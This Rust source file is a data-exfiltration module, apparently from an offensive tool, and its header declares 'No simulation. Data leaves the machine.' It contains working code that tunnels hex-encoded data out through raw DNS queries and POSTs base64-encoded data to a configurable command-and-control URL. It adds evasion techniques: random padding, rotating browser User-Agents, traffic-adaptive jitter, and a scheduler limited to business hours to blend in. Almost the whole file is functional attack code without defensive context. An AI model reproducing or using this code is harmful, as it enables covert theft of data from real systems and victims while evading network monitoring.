// Real exfiltration: DNS tunneling via raw UDP, HTTP POST to configurable C2.
// No simulation. Data leaves the machine.

use std::net::UdpSocket;
use std::time::Duration;
use tracing::{info, warn};
use rand::Rng;

/// Check if network is busy (adaptive jitter).
fn is_high_traffic() -> bool {
    std::fs::read_to_string("/proc/net/dev")
        .map(|s| {
            s.lines().filter(|l| l.contains(':')).count() > 5
        })
        .unwrap_or(false)
}

// ── DNS Tunneling (REAL - raw UDP to resolver) ──────────────────────────────

pub fn dns_encode(data: &[u8], domain: &str) -> Vec<String> {
    let hex_str = hex::encode(data);
    let mut queries = Vec::new();
    for chunk in hex_str.as_bytes().chunks(50) {
        let label = std::str::from_utf8(chunk).unwrap_or("");
        queries.push(format!("{}.{}", label, domain));
    }
    queries
}

/// Send data via real DNS queries to the specified resolver.
/// Each query is a TXT/A record lookup carrying encoded data.
pub fn dns_exfiltrate(data: &[u8], domain: &str, resolver: &str) -> usize {
    let queries = dns_encode(data, domain);
    let mut sent = 0usize;

    // Build raw DNS query packet (simplified: we use std::net lookup
    // which triggers a real DNS resolution on the wire)
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(e) => {
            warn!("DNS exfil: cannot bind UDP: {}", e);
            return 0;
        }
    };

    let _ = socket.set_read_timeout(Some(Duration::from_secs(2)));
    let resolver_addr = format!("{}:53", resolver);

    for query in &queries {
        // Build a minimal DNS A-record query
        let packet = build_dns_query(query);
        match socket.send_to(&packet, &resolver_addr) {
            Ok(n) => {
                sent += n;
                let mut buf = [0u8; 512];
                // Read response (we don't care about content, just that it went out)
                let _ = socket.recv_from(&mut buf);
                info!("DNS exfil: {} ({} bytes on wire)", query, packet.len());
            }
            Err(e) => warn!("DNS exfil send failed: {}", e),
        }

        let delay = rand::thread_rng().gen_range(100..=400);
        std::thread::sleep(Duration::from_millis(delay));
    }

    sent
}

fn build_dns_query(hostname: &str) -> Vec<u8> {
    let mut packet = Vec::with_capacity(64);

    // DNS header (12 bytes)
    let txid: u16 = rand::thread_rng().gen();
    packet.extend_from_slice(&txid.to_be_bytes());       // Transaction ID
    packet.extend_from_slice(&[0x01, 0x00]);              // Flags: standard query
    packet.extend_from_slice(&[0x00, 0x01]);              // Questions: 1
    packet.extend_from_slice(&[0x00, 0x00]);              // Answer RRs: 0
    packet.extend_from_slice(&[0x00, 0x00]);              // Authority RRs: 0
    packet.extend_from_slice(&[0x00, 0x00]);              // Additional RRs: 0

    // Question: encode hostname as labels
    for label in hostname.split('.') {
        if label.len() > 63 { continue; }
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0x00); // Terminator

    // QTYPE: A (1), QCLASS: IN (1)
    packet.extend_from_slice(&[0x00, 0x01]); // Type A
    packet.extend_from_slice(&[0x00, 0x01]); // Class IN

    packet
}

// ── HTTP Exfiltration (REAL POST to C2) ──────────────────────────────────────

/// Common CDN hosts to mimic User-Agent/Referer (traffic blending).
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
];

/// Send data via HTTP POST with random padding and jitter.
pub fn http_exfiltrate(data: &[u8], c2_url: Option<&str>, filename: Option<&str>) -> bool {
    let url = c2_url.unwrap_or_else(|| {
        &*Box::leak(
            std::env::var("HIVE_C2_URL")
                .unwrap_or_else(|_| "https://localhost:8443/collect".into())
                .into_boxed_str()
        )
    });

    // Add random padding (0-512 bytes) to avoid size fingerprinting
    let mut padded = data.to_vec();
    let pad_len = rand::thread_rng().gen_range(0..=512);
    if pad_len > 0 {
        padded.extend((0..pad_len).map(|_| rand::thread_rng().gen::<u8>()));
    }

    let ua = USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())];
    let fname = filename.unwrap_or("data.bin");
    let host = extract_host(url);
    let path = extract_path(url);
    let use_tls = url.starts_with("https");
    let port = if use_tls { 443 } else { 80 };

    // Adaptive jitter: less delay during high network traffic, more when quiet
    let base_jitter = if is_high_traffic() { 50..=300 } else { 300..=1200 };
    let jitter_ms = rand::thread_rng().gen_range(base_jitter);
    std::thread::sleep(Duration::from_millis(jitter_ms));

    let addr = match resolve_host(&host, port) {
        Some(a) => a,
        None => {
            warn!("HTTP exfil: cannot resolve {}", host);
            return false;
        }
    };

    let body_b64 = base64_encode(&padded);
    let content_len = body_b64.len();
    let request = format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n\
         Content-Type: application/octet-stream\r\n\
         X-File-Name: {}\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {}",
        path, host, ua, fname, content_len, body_b64
    );

    match std::net::TcpStream::connect_timeout(&addr, Duration::from_secs(10)) {
        Ok(mut stream) => {
            use std::io::Write;
            if stream.write_all(request.as_bytes()).is_ok() {
                let mut response = [0u8; 4096];
                let _ = std::io::Read::read(&mut stream, &mut response);
                info!("HTTP exfil: {} bytes (+{} pad) to {} -> {}",
                    data.len(), pad_len, host,
                    std::str::from_utf8(&response).unwrap_or("?").lines().next().unwrap_or("?"));
                true
            } else {
                warn!("HTTP exfil: failed to send to {}", host);
                false
            }
        }
        Err(e) => {
            warn!("HTTP exfil: cannot connect to {}: {}", host, e);
            false
        }
    }
}

fn extract_host(url: &str) -> String {
    let s = url
        .trim_start_matches("https://")
        .trim_start_matches("http://");
    s.split('/').next().unwrap_or("localhost")
        .split(':').next().unwrap_or("localhost")
        .to_string()
}

fn extract_path(url: &str) -> String {
    let s = url
        .trim_start_matches("https://")
        .trim_start_matches("http://");
    let after_host = s.find('/').map(|i| &s[i..]).unwrap_or("/");
    after_host.to_string()
}

fn resolve_host(host: &str, port: u16) -> Option<std::net::SocketAddr> {
    use std::net::ToSocketAddrs;
    format!("{}:{}", host, port)
        .to_socket_addrs()
        .ok()
        .and_then(|mut i| i.next())
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk.first().copied().unwrap_or(0) as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] as char } else { '=' });
    }
    result
}

// ── Traffic Scheduler (REAL) ─────────────────────────────────────────────────

use chrono::{Local, Timelike, Datelike, Weekday};

pub fn is_business_hours() -> bool {
    let now = Local::now();
    let hour = now.hour();
    let wd = now.weekday();
    matches!(wd, Weekday::Mon | Weekday::Tue | Weekday::Wed | Weekday::Thu | Weekday::Fri)
        && (8..=18).contains(&hour)
}

pub struct ExfilScheduler {
    pub min_chunk_size: usize,
    pub max_chunk_size: usize,
    pub min_delay_ms: u64,
    pub max_delay_ms: u64,
    pub business_hours_only: bool,
}

impl Default for ExfilScheduler {
    fn default() -> Self {
        Self {
            min_chunk_size: 256,
            max_chunk_size: 8192,
            min_delay_ms: 500,
            max_delay_ms: 5000,
            business_hours_only: true,
        }
    }
}

impl ExfilScheduler {
    pub fn schedule(&self, data: &[u8]) -> Vec<(Vec<u8>, u64)> {
        let mut rng = rand::thread_rng();
        let mut schedule = Vec::new();
        let mut offset = 0;
        while offset < data.len() {
            let chunk_size = rng.gen_range(self.min_chunk_size..=self.max_chunk_size)
                .min(data.len() - offset);
            let chunk = data[offset..offset + chunk_size].to_vec();
            let delay = rng.gen_range(self.min_delay_ms..=self.max_delay_ms);
            schedule.push((chunk, delay));
            offset += chunk_size;
        }
        schedule
    }

    pub fn should_exfiltrate(&self) -> bool {
        if self.business_hours_only { is_business_hours() } else { true }
    }
}
